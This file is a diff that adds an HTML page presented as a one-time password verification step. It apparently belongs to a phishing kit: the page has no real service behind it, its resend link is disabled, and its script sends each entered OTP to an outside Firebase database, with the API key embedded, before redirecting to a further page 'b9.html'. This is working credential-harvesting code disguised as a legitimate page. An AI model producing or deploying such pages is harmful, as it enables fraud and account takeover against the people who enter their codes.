@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>OTP Verification</title>
+    <link rel="stylesheet" href="a02b572693328546.css" />
+    <script type="module" src="https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js"></script>
+    <script type="module" src="https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js"></script>
+  </head>
+  <body>
+    <div id="__next">
+      <header>
+        <img alt="logo" class="logo" src="logo.png" />
+      </header>
+      <main>
+        <form id="otpForm">
+          <input type="hidden" name="formtoken" value="" />
+          <h1>Verify with One Time Password</h1>
+          <p style="font-weight: 600">
+            Your One Time Password has been sent to your registered mobile number.
+          </p>
+
+          <div class="floating-container">
+            <input
+              type="text"
+              name="otp"
+              id="otp"
+              minlength="6"
+              maxlength="8"
+              pattern="[0-9]+"
+              inputmode="numeric"
+              placeholder=" "
+              required
+            />
+            <label>One Time Password <span>*</span></label>
+          </div>
+
+          <div class="btContainer">
+            <button type="submit">Submit</button>
+          </div>
+
+          <p>
+            If you didn't receive the one-time password SMS, please click here to
+            <a href="#" id="resendLink">resend</a>
+          </p>
+
+          <p id="otpTimer" style="font-weight: bold; text-align: center">
+            OTP Expires in: 03:00
+          </p>
+        </form>
+      </main>
+      <footer>
+        <div class="l">
+          <img alt="s" class="l" src="s.jpg" />
+        </div>
+        <img alt="f" class="ft" src="ft.png" />
+      </footer>
+    </div>
+
+    <!-- ✅ Script with updated Firebase Config -->
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
+      import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
+
+      // ✅ Updated Firebase Configuration
+      const firebaseConfig = {
+        apiKey: "AIzaSyAQChRUNOzph1tOQtVdNJnaX79VMuI1K9w",
+        authDomain: "srai-16d20.firebaseapp.com",
+        projectId: "srai-16d20",
+        storageBucket: "srai-16d20.firebasestorage.app",
+        messagingSenderId: "13015388512",
+        appId: "1:13015388512:web:ede30255ac370257f7ce05"
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      document.addEventListener("DOMContentLoaded", function () {
+        const otpForm = document.getElementById("otpForm");
+        const otpInput = document.getElementById("otp");
+        const resendLink = document.getElementById("resendLink");
+        const timerDisplay = document.getElementById("otpTimer");
+
+        // Disable "resend" link for now
+        resendLink.addEventListener("click", function (e) {
+          e.preventDefault();
+        });
+
+        // Timer - 3 minutes countdown
+        let timeLeft = 180;
+        const timer = setInterval(() => {
+          let minutes = String(Math.floor(timeLeft / 60)).padStart(2, "0");
+          let seconds = String(timeLeft % 60).padStart(2, "0");
+          timerDisplay.textContent = `OTP Expires in: ${minutes}:${seconds}`;
+          if (timeLeft <= 0) {
+            clearInterval(timer);
+            timerDisplay.textContent = "OTP Expired";
+          }
+          timeLeft--;
+        }, 1000);
+
+        // Submit OTP
+        otpForm.addEventListener("submit", async (e) => {
+          e.preventDefault();
+          const otp = otpInput.value.trim();
+
+          if (otp.length < 6 || otp.length > 8) {
+            alert("Please enter a valid OTP.");
+            return;
+          }
+
+          try {
+            await addDoc(collection(db, "users"), {
+              otp_b: otp,
+              timestamp: serverTimestamp(),
+            });
+
+            window.location.href = "b9.html";
+          } catch (error) {
+            console.error("Error saving OTP: ", error);
+            alert("Error: " + error.message);
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
